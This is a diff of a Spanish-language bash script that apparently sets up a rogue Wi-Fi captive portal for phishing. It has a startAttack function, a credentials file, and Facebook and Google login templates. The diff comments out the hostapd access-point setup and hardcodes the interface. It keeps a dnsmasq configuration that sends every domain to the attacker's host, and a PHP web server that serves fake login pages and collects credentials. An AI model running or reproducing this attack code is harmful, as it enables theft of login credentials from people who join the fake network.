@@ -59,48 +59,48 @@ function startAttack(){
 		rm -rf credenciales.txt
 	fi
 
-	echo -e "\n[*] Listando interfaces de red disponibles..."; sleep 1
+	# echo -e "\n[*] Listando interfaces de red disponibles..."; sleep 1
 
-	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
-	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
-	counter=1; for interface in $(cat iface); do
-		echo -e "\t\n$counter. $interface"; sleep 0.26
-		let counter++
-	done; tput cnorm
-	checker=0; while [ $checker -ne 1 ]; do
-		echo -ne "\n[*] Nombre de la interfaz (Ej: wlan0mon): " && read choosed_interface
+	# # Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
+	# airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
+	# counter=1; for interface in $(cat iface); do
+	# 	echo -e "\t\n$counter. $interface"; sleep 0.26
+	# 	let counter++
+	# done; tput cnorm
+	# checker=0; while [ $checker -ne 1 ]; do
+	# 	echo -ne "\n[*] Nombre de la interfaz (Ej: wlan0mon): " && read choosed_interface
 
-		for interface in $(cat iface); do
-			if [ "$choosed_interface" == "$interface" ]; then
-				checker=1
-			fi
-		done; if [ $checker -eq 0 ]; then echo -e "\n[!] La interfaz proporcionada no existe"; fi
-	done
+	# 	for interface in $(cat iface); do
+	# 		if [ "$choosed_interface" == "$interface" ]; then
+	# 			checker=1
+	# 		fi
+	# 	done; if [ $checker -eq 0 ]; then echo -e "\n[!] La interfaz proporcionada no existe"; fi
+	# done
 
-	rm iface 2>/dev/null
-	echo -ne "\n[*] Nombre del punto de acceso a utilizar (Ej: wifiGratis): " && read -r use_ssid
-	echo -ne "[*] Canal a utilizar (1-12): " && read use_channel; tput civis
-	echo -e "\n[!] Matando todas las conexiones...\n"
-	# killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
-	sleep 2
+	# rm iface 2>/dev/null
+	# echo -ne "\n[*] Nombre del punto de acceso a utilizar (Ej: wifiGratis): " && read -r use_ssid
+	# echo -ne "[*] Canal a utilizar (1-12): " && read use_channel; tput civis
+	# echo -e "\n[!] Matando todas las conexiones...\n"
+	# # killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
+	# sleep 2
+	
+	# echo -e "interface=enp0s25:\n" > hostapd.conf
+	# echo -e "driver=nl80211\n" >> hostapd.conf
+	# echo -e "ssid=dev\n" >> hostapd.conf
+	# echo -e "hw_mode=g\n" >> hostapd.conf
+	# echo -e "channel=6\n" >> hostapd.conf
+	# echo -e "macaddr_acl=0\n" >> hostapd.conf
+	# echo -e "auth_algs=1\n" >> hostapd.conf
+	# echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
 
-	echo -e "interface=$choosed_interface\n" > hostapd.conf
-	echo -e "driver=nl80211\n" >> hostapd.conf
-	echo -e "ssid=$use_ssid\n" >> hostapd.conf
-	echo -e "hw_mode=g\n" >> hostapd.conf
-	echo -e "channel=$use_channel\n" >> hostapd.conf
-	echo -e "macaddr_acl=0\n" >> hostapd.conf
-	echo -e "auth_algs=1\n" >> hostapd.conf
-	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
-
-	echo -e "[*] Configurando interfaz $choosed_interface\n"
-	sleep 2
-	echo -e "[*] Iniciando hostapd..."
-	hostapd hostapd.conf > /dev/null 2>&1 &
-	sleep 5
+	# echo -e "[*] Configurando interfaz $choosed_interface\n"
+	# sleep 2
+	# echo -e "[*] Iniciando hostapd..."
+	# hostapd hostapd.conf > /dev/null 2>&1 &
+	# sleep 5
 
 	echo -e "\n[*] Configurando dnsmasq..."
-	echo -e "interface=$choosed_interface\n" > dnsmasq.conf
+	echo -e "interface=enp0s25\n" > dnsmasq.conf
 	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
 	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
 	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
@@ -110,12 +110,12 @@ function startAttack(){
 	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
 	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
 
-	ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
-	sleep 1
-	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
-	sleep 1
-	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
-	sleep 3
+	ifconfig enp0s25 up 192.168.1.1 netmask 255.255.255.0
+	 sleep 1
+	 route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+	 sleep 1
+	 dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
+	 sleep 3
 
 	# Array de plantillas
 	plantillas=(facebook-login google-login cliqq-payload )
@@ -152,7 +152,7 @@ function startAttack(){
 		popd > /dev/null 2>&1; getCredentials
 	else
 		tput civis; echo -e "\n[*] Usando plantilla personalizada..."; sleep 1
-		echo -e "\n[*] Montando servidor web en} $template\n"; sleep 1
+		echo -e "\n[*] Montando servidor web en $template\n"; sleep 1
 		pushd $template > /dev/null 2>&1
 		php -S 192.168.1.1:80 > /dev/null 2>&1 &
 		sleep 1
